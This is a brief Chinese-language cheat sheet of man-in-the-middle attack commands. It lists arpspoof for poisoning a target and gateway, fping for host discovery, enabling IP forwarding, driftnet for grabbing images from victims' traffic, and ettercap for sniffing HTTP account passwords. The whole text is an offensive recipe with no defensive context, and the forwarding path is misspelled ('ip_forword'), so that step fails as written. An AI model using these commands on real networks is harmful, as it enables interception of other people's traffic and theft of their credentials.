

1. arp 欺骗

   1. arpspoof -i 网卡 -t ip地址 网关   
   2. fping -asg 网络地址
   3. echo 1 >/proc/sys/net/ipv4/ip_forword 流量转发
   4. 获取本机网卡的图片 driftnet -i eth0

2. http账号密码

   1. 开启arp欺骗
   2. ettercap -Tq -i eth0

    

    

